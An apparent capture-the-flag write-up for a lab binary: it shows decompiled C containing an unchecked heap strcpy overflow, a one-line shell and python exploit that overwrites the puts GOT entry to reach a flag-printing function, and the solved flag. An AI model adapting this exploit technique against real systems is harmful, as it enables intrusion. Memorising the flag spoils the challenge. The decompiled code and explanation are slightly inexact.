```c
void m()
{
  time_t time;
  
  time = time((time_t *)0x0);
  printf("%s - %d\n", c, time);
  return;
}

int main(int argc, char **argv)

{
  char *str1;
  void *ptr1;
  char *str2;
  FILE *flag;
  
  str1 = (char *)malloc(8);
  *str1 = 1;

  ptr1 = malloc(8);
  str1[1] = ptr1;

  str2 = (char *)malloc(8);
  *str2 = 2;
  ptr1 = malloc(8);
  str2[1] = ptr1;

  strcpy((char *)str1[1], argv[1]);
  strcpy((char *)str2[1], argv[2]);

  flag = fopen("/home/user/level8/.pass","r");

  fgets(c, 68, flag);

  puts("~~"); // 
  return 0;
}
```

Just like in level5, we need to override the pointer of `puts` in order to access the `m` function, which is the one that prints the flag (`c`).

In order to do that, we can overflow the first argument into the second, which will help us replace the address of `c` (first address after the padding) by the address of `m` (second argument)

```bash
./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"') 
```
flag: `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`
